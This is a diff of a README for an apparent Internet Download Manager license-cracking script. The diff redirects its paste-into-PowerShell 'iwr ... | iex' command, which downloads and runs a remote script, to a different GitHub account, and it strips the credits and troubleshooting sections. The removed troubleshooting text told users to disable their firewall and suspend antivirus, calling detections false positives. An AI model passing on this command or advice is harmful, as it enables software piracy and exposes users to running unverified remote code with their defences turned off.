@@ -44,7 +44,7 @@ Right-click on the windows start menu and select PowerShell or Terminal.
 
 Copy-paste the below code and press enter:
 
-    iwr -useb https://naeembolchhi.github.io/IDM-Activator/IDMA.ps1 | iex
+    iwr -useb https://github.com/asheekujjaman/IDM-Active/IDMA.ps1 | iex
 
 You will see the activation options, and follow onscreen instructions.
 
@@ -66,43 +66,3 @@ That's all.
 
 <br>
 
-###   Troubleshooting
-
----
-
-   - If any other activator was used to activate IDM previously then make sure to properly uninstall it with that same activator (if there is an option), this is especially important if any registry/firewall block method was used.
-     
-     - If you're unable to properly remove the older IDM from everywhere (including registry), try using Revo Uninstaller Pro to scan and delete file and registry remnants.
-
-   - Uninstall the IDM from the control panel.
-
-   - Make sure the latest original IDM setup is used for the installation.
-     
-   - Download IDM: https://www.internetdownloadmanager.com/download.html
-
-   - Now install the IDM and use the activate option in this script if failed then,
-
-     - Disable the windows firewall with the script option, this helps in case of leftover entries of previously used activator (some file patch method also creates firewall entries).
-
-     - Some security programs may block this script, this is false-positive, as long as you downloaded the file from the original post (mentioned below on this page), temporary suspend Antivirus real-time protection, or exclude the downloaded file/extracted folder from scanning.
-
-     - If you are still facing any problems, please create an issue on this repo.
-
-<br>
-
-###   Credits
-
----
-
-| **Dev** | **Contribution** |
-|---|---|
-| @Dukun Cabul | Original researcher of this IDM trial reset and activation logic, made an Autoit tool for these methods, IDM\-AIO\_2020\_Final |
-|  | nsaneforums\.com/topic/371047\-\-/?do=findComment&comment=1632062 |
-| @WindowsAddict | Ported the above Autoit tool to a batch script |
-| @AveYo aka @BAU | Snippet to set registry ownership and permission recursively |
-|  | pastebin\.com/XTPt0JSC |
-| @abbodi1406 | Awesome batch script tricks and help |
-| @dbenham | Set buffer height independently of window height |
-|  | stackoverflow\.com/a/13351373 |
-| @ModByPiash | Added and fixed some missing features |
-| @NaeemBolchhi \(Me\) | Improved username generation |
